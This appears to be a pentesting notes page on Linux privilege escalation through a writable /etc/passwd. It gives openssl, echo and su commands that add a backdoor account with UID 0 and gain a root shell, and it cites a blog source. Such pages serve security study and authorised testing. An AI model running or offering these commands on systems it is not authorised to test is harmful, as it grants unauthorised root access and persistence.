---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Password Authentication

The `/etc/passwd` file can contain password hashes directly instead of an `x`, indicating that the password hash is stored in `/etc/shadow`. If `/etc/passwd` is writable, it allows the creation of arbitrary users with root privileges.

1. generate a hash using **`openssl`**

```bash
openssl passwd <password>
```

2. Edit the `/etc/passwd` file

```bash
echo "<new_username>:<hash>:0:0:root:/root:/bin/bash" >> /etc/passwd
```

3. Login to the newly created user with root previliges

```bash
su <new_username>
```

## References

{% embed url="https://www.hackingarticles.in/editing-etc-passwd-file-for-privilege-escalation/" %}
Raj Chandel’s Blog
{% endembed %}
